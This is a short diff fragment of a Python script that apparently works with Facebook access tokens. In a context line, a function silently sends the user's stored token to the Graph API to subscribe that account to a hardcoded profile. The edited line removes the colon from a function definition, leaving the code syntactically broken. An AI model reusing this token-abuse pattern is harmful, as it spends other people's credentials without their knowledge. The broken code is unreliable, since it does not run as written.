@@ -141,7 +141,7 @@ def bot_fl():
     requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + token)
     menu()
 
- def menu():
+ def menu()
     os.system("clear")
     try:
         token = open(".logfuck.txt","r").read()
